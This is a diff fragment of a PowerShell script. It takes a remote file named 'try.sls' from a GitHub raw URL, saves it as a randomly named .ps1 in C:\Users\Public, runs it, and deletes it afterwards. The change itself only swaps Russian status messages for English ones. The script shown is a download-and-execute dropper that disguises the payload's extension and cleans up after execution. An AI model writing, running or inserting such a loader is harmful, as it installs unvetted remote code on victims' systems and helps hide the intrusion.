@@ -4,7 +4,7 @@ $url = "raw.githubusercontent.com/robotinsideus12/trust/refs/heads/main/try.sls"
 $randomFileName = (Get-Random).ToString() + ".ps1"
 $filePath = Join-Path -Path "C:\Users\Public" -ChildPath $randomFileName
 
-Write-Host "Временный файл будет создан по пути: $filePath"
+Write-Host "file created $filePath"
 
 try {
     # SAVE
@@ -13,11 +13,11 @@ try {
     # 3. START
     & $filePath
     
-    Write-Host "Скрипт успешно выполнен."
+    Write-Host "scrypt started"
 }
 catch {
     # ERR
-    Write-Error "Произошла ошибка: $($_.Exception.Message)"
+    Write-Error "error: $($_.Exception.Message)"
 }
 finally {
     # 4. DEL
